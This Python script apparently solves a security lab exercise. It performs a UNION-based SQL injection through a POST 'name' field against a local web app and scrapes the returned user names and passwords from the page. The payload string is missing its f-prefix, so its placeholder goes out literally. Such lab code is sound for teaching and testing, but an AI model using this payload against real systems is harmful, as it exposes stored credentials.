from random import random
import requests
from bs4 import BeautifulSoup as bs

'''
    We are trying to extract sensitive data (such as passwords)
    simply by "augumenting" our column space using an UNION
'''

general_request = "http://127.0.0.1:5001/users"

'''
    Now the request type is POST and not GET as before
'''
def solution():

    def sql_injection():
        random_string = 'sakjd'
        return "{random_string}' union select name, password from users where '1'='1"

    def page_scraping(page):

        parsed_page = bs(page.text, 'html.parser')

        users_info = parsed_page.find_all('p', class_='list-group-item')

        text = ''
        for x in users_info:
            x = x.text.split(":")
            text += f"User: {x[0]}\nPassword: {x[1]}\n\n"

        return text

    params = {'name' : sql_injection()}
    return page_scraping(requests.post(general_request, data=params))

if __name__ == '__main__':
    sol = solution()
    print(sol)